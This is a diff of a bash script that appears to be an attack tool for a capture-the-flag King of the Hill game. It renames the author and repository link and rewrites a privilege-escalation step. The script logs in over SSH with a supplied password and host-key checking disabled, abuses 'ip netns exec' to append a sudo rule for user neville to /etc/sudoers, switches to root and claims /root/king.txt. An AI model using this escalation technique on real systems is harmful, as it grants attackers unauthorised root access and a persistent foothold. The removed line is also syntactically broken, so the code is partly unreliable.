@@ -1,8 +1,8 @@
 #!/bin/bash
 
-# Created by @HaruKey :)
+# Created by @0xVoid :)
 
-# https://github.com/H4ruKey/KOTH
+# https://github.com/0x76OID/KOTH
 
 missing() {
   if ! command -v "$1" >/dev/null 2>&1; then
@@ -59,7 +59,7 @@ vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 sshpass -p "$ssh_pass" ssh -o StrictHostKeychecking=no neville@"$IP" -p "$SSH_PORT" << EOF
 
-    ip netns add foo && ip netns exec foo sed -i '/^#includedir \/etc\/sudoers.d/a neville ALL=(ALL) NOPASSWD: /bin/su' {} \;
+    sudo ip netns exec foo bash -c 'echo "neville ALL=(ALL:ALL) ALL" >> /etc/sudoers'
     sleep 1
     sudo su
     echo "$username" > /root/king.txt
